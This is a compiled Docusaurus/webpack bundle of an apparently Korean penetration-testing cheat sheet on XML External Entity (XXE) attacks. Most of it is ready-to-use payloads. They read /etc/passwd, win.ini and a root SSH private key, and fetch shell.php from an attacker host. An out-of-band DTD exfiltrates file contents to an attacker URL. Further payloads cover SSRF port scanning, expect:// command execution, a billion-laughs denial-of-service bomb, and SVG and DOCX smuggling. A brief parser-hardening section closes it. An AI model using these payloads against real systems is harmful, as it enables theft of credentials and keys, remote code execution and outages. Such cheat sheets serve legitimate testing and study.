"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[2030],{6417:(e,l,n)=>{n.r(l),n.d(l,{assets:()=>r,contentTitle:()=>a,default:()=>c,frontMatter:()=>s,metadata:()=>i,toc:()=>x});const i=JSON.parse('{"id":"cheatsheet/web-application/xxe","title":"XML External Entity (XXE)","description":"\uae30\ubcf8 \ud398\uc774\ub85c\ub4dc","source":"@site/docs/cheatsheet/web-application/xxe.md","sourceDirName":"cheatsheet/web-application","slug":"/cheatsheet/web-application/xxe","permalink":"/my-docusaurus-page/cheatsheet/web-application/xxe","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":7,"frontMatter":{"sidebar_position":7},"sidebar":"tutorialSidebar","previous":{"title":"Server-Side Template Injection (SSTI)","permalink":"/my-docusaurus-page/cheatsheet/web-application/ssti"},"next":{"title":"Wfuzz","permalink":"/my-docusaurus-page/cheatsheet/web-application/wfuzz"}}');var t=n(4848),o=n(8453);const s={sidebar_position:7},a="XML External Entity (XXE)",r={},x=[{value:"\uae30\ubcf8 \ud398\uc774\ub85c\ub4dc",id:"\uae30\ubcf8-\ud398\uc774\ub85c\ub4dc",level:2},{value:"/etc/passwd \uc77d\uae30",id:"etcpasswd-\uc77d\uae30",level:3},{value:"Windows \ud30c\uc77c \uc77d\uae30",id:"windows-\ud30c\uc77c-\uc77d\uae30",level:3},{value:"SSH \ud0a4 \uc77d\uae30",id:"ssh-\ud0a4-\uc77d\uae30",level:3},{value:"HTTP \uc694\uccad \uc608\uc81c",id:"http-\uc694\uccad-\uc608\uc81c",level:2},{value:"\ud30c\uc77c \uc77d\uae30",id:"\ud30c\uc77c-\uc77d\uae30",level:2},{value:"SSRF via XXE",id:"ssrf-via-xxe",level:2},{value:"Blind XXE",id:"blind-xxe",level:2},{value:"Out-of-Band Data Exfiltration",id:"out-of-band-data-exfiltration",level:3},{value:"Error-Based XXE",id:"error-based-xxe",level:3},{value:"\ud30c\ub77c\ubbf8\ud130 \uc5d4\ud2f0\ud2f0",id:"\ud30c\ub77c\ubbf8\ud130-\uc5d4\ud2f0\ud2f0",level:2},{value:"XXE to RCE",id:"xxe-to-rce",level:2},{value:"expect:// (PHP)",id:"expect-php",level:3},{value:"XML Bomb (DoS)",id:"xml-bomb-dos",level:2},{value:"Content-Type",id:"content-type",level:2},{value:"XXE via SVG",id:"xxe-via-svg",level:2},{value:"XXE via DOCX",id:"xxe-via-docx",level:2},{value:"\ubc29\uc5b4 \ubc29\ubc95",id:"\ubc29\uc5b4-\ubc29\ubc95",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function d(e){const l={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(l.header,{children:(0,t.jsx)(l.h1,{id:"xml-external-entity-xxe",children:"XML External Entity (XXE)"})}),"\n",(0,t.jsx)(l.h2,{id:"\uae30\ubcf8-\ud398\uc774\ub85c\ub4dc",children:"\uae30\ubcf8 \ud398\uc774\ub85c\ub4dc"}),"\n",(0,t.jsx)(l.h3,{id:"etcpasswd-\uc77d\uae30",children:"/etc/passwd \uc77d\uae30"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE xxe [ <!ENTITY passwd SYSTEM \'file:///etc/passwd\'> ]>\n<stockCheck>\n    <productId>&passwd;</productId>\n    <storeId>1</storeId>\n</stockCheck>\n'})}),"\n",(0,t.jsx)(l.h3,{id:"windows-\ud30c\uc77c-\uc77d\uae30",children:"Windows \ud30c\uc77c \uc77d\uae30"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:"<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>\n<order>\n    <quantity>3</quantity>\n    <item>&test;</item>\n    <address>17th Estate, CA</address>\n</order>\n"})}),"\n",(0,t.jsx)(l.h3,{id:"ssh-\ud0a4-\uc77d\uae30",children:"SSH \ud0a4 \uc77d\uae30"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{children:'username=%26username%3b&version=1.0.0--\x3e<!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]>\x3c!--\n'})}),"\n",(0,t.jsx)(l.h2,{id:"http-\uc694\uccad-\uc608\uc81c",children:"HTTP \uc694\uccad \uc608\uc81c"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-http",children:'POST / HTTP/1.1\nHost: <RHOST>:<RPORT>\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/xml\nContent-Length: 136\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>\n<foo>&xxe;</foo>\n'})}),"\n",(0,t.jsx)(l.h2,{id:"\ud30c\uc77c-\uc77d\uae30",children:"\ud30c\uc77c \uc77d\uae30"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'\x3c!-- Linux --\x3e\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n\n\x3c!-- Windows --\x3e\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini"> ]>\n\n\x3c!-- PHP Wrapper --\x3e\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>\n'})}),"\n",(0,t.jsx)(l.h2,{id:"ssrf-via-xxe",children:"SSRF via XXE"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin"> ]>\n\n\x3c!-- \ud3ec\ud2b8 \uc2a4\uce94 --\x3e\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:80"> ]>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:22"> ]>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:3306"> ]>\n'})}),"\n",(0,t.jsx)(l.h2,{id:"blind-xxe",children:"Blind XXE"}),"\n",(0,t.jsx)(l.h3,{id:"out-of-band-data-exfiltration",children:"Out-of-Band Data Exfiltration"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://<LHOST>/evil.dtd">\n  %xxe;\n]>\n'})}),"\n",(0,t.jsx)(l.p,{children:(0,t.jsx)(l.strong,{children:"evil.dtd \ub0b4\uc6a9:"})}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://<LHOST>/?data=%file;\'>">\n%eval;\n%exfiltrate;\n'})}),"\n",(0,t.jsx)(l.h3,{id:"error-based-xxe",children:"Error-Based XXE"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM "file:///etc/passwd">\n  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">\n  %eval;\n  %error;\n]>\n'})}),"\n",(0,t.jsx)(l.h2,{id:"\ud30c\ub77c\ubbf8\ud130-\uc5d4\ud2f0\ud2f0",children:"\ud30c\ub77c\ubbf8\ud130 \uc5d4\ud2f0\ud2f0"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://<LHOST>/evil.dtd">\n  %xxe;\n  %param1;\n]>\n<foo>&exfil;</foo>\n'})}),"\n",(0,t.jsx)(l.h2,{id:"xxe-to-rce",children:"XXE to RCE"}),"\n",(0,t.jsx)(l.h3,{id:"expect-php",children:"expect:// (PHP)"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "expect://id">\n]>\n'})}),"\n",(0,t.jsx)(l.p,{children:(0,t.jsx)(l.strong,{children:"php.ini \uc124\uc815 \ud544\uc694:"})}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-ini",children:"extension=expect.so\n"})}),"\n",(0,t.jsx)(l.h2,{id:"xml-bomb-dos",children:"XML Bomb (DoS)"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol "lol">\n  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n]>\n<lolz>&lol6;</lolz>\n'})}),"\n",(0,t.jsx)(l.h2,{id:"content-type",children:"Content-Type"}),"\n",(0,t.jsx)(l.p,{children:"XXE\ub294 \ub2e4\uc74c Content-Type\uc5d0\uc11c \uac00\ub2a5:"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{children:"application/xml\ntext/xml\napplication/soap+xml\napplication/xhtml+xml\napplication/rss+xml\napplication/atom+xml\nimage/svg+xml\n"})}),"\n",(0,t.jsx)(l.h2,{id:"xxe-via-svg",children:"XXE via SVG"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<svg xmlns="http://www.w3.org/2000/svg">\n  <text>&xxe;</text>\n</svg>\n'})}),"\n",(0,t.jsx)(l.h2,{id:"xxe-via-docx",children:"XXE via DOCX"}),"\n",(0,t.jsx)(l.p,{children:"DOCX \ud30c\uc77c\uc740 ZIP \uc544\uce74\uc774\ube0c\uc774\uba70 XML \ud30c\uc77c \ud3ec\ud568:"}),"\n",(0,t.jsxs)(l.ol,{children:["\n",(0,t.jsx)(l.li,{children:"DOCX \uc555\ucd95 \ud574\uc81c"}),"\n",(0,t.jsxs)(l.li,{children:[(0,t.jsx)(l.code,{children:"word/document.xml"})," \uc218\uc815"]}),"\n",(0,t.jsx)(l.li,{children:"XXE \ud398\uc774\ub85c\ub4dc \uc0bd\uc785"}),"\n",(0,t.jsx)(l.li,{children:"\ub2e4\uc2dc \uc555\ucd95"}),"\n"]}),"\n",(0,t.jsx)(l.h2,{id:"\ubc29\uc5b4-\ubc29\ubc95",children:"\ubc29\uc5b4 \ubc29\ubc95"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-xml",children:'\x3c!-- PHP --\x3e\nlibxml_disable_entity_loader(true);\n\n\x3c!-- Java --\x3e\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nfactory.setFeature("http://xml.org/sax/features/external-general-entities", false);\nfactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);\n\n\x3c!-- .NET --\x3e\nsettings.DtdProcessing = DtdProcessing.Prohibit;\n'})}),"\n",(0,t.jsx)(l.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,t.jsxs)(l.ul,{children:["\n",(0,t.jsx)(l.li,{children:"XXE\ub294 XML \ud30c\uc11c\uac00 \uc678\ubd80 \uc5d4\ud2f0\ud2f0\ub97c \ucc98\ub9ac\ud560 \ub54c \ubc1c\uc0dd"}),"\n",(0,t.jsx)(l.li,{children:"\ud30c\uc77c \uc77d\uae30, SSRF, RCE \uac00\ub2a5"}),"\n",(0,t.jsx)(l.li,{children:"Blind XXE\ub294 Out-of-Band \uae30\ubc95 \uc0ac\uc6a9"}),"\n",(0,t.jsx)(l.li,{children:"SVG, DOCX, XLSX \ub4f1\uc5d0\uc11c\ub3c4 XXE \uac00\ub2a5"}),"\n",(0,t.jsx)(l.li,{children:"Content-Type\uc744 XML\ub85c \ubcc0\uacbd\ud574\uc11c \ud14c\uc2a4\ud2b8"}),"\n",(0,t.jsx)(l.li,{children:"DTD (Document Type Definition) \uc0ac\uc6a9"}),"\n"]})]})}function c(e={}){const{wrapper:l}={...(0,o.R)(),...e.components};return l?(0,t.jsx)(l,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453:(e,l,n)=>{n.d(l,{R:()=>s,x:()=>a});var i=n(6540);const t={},o=i.createContext(t);function s(e){const l=i.useContext(o);return i.useMemo(function(){return"function"==typeof e?e(l):{...l,...e}},[l,e])}function a(e){let l;return l=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:s(e.components),i.createElement(o.Provider,{value:l},e.children)}}}]);